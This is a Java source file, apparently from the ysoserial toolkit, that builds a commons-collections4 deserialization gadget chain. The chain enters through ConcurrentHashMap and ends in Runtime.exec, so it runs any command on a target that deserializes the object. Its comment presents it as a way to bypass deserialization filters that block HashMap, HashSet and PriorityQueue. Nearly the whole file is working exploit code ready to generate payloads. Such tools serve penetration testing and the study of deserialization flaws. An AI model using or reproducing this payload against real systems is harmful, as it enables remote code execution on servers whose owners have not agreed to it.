package ysoserial.payloads;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.Serializable;

/*
	CC4 chain via ConcurrentHashMap entry point — bypasses HashMap/HashSet/PriorityQueue filters.

	Gadget chain:
		ObjectInputStream.readObject()
			ConcurrentHashMap.readObject()
				ConcurrentHashMap.putVal()
					key.hashCode()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										ConstantTransformer.transform()
										InvokerTransformer.transform()
											Method.invoke()
												Runtime.exec()

	Like CC10 but uses commons-collections4 classes instead of commons-collections3.
	This is important because some targets only have CC4, not CC3.

	ConcurrentHashMap.readObject() calls putVal() which calls spread(key.hashCode()),
	triggering TiedMapEntry.hashCode() → LazyMap.get() → transformer chain → RCE.

	Requires:
		commons-collections4 4.0+ (TiedMapEntry, LazyMap, InvokerTransformer)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.SU18 })
public class CommonsCollections11 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		final String[] execArgs = new String[] { command };

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real transformers to arm later
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain);

		// CC4's TiedMapEntry
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// ConcurrentHashMap as entry gadget
		ConcurrentHashMap<Object, Object> chm = new ConcurrentHashMap<Object, Object>(1);
		chm.put("dummy", "bar");

		// Replace key in ConcurrentHashMap's internal Node table
		Field tableField = ConcurrentHashMap.class.getDeclaredField("table");
		Reflections.setAccessible(tableField);
		Object[] table = (Object[]) tableField.get(chm);

		for (int i = 0; i < table.length; i++) {
			if (table[i] != null) {
				Field keyField = table[i].getClass().getDeclaredField("key");
				Reflections.setAccessible(keyField);
				keyField.set(table[i], entry);
				break;
			}
		}

		// Arm the transformer chain
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return chm;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections11.class, args);
	}
}
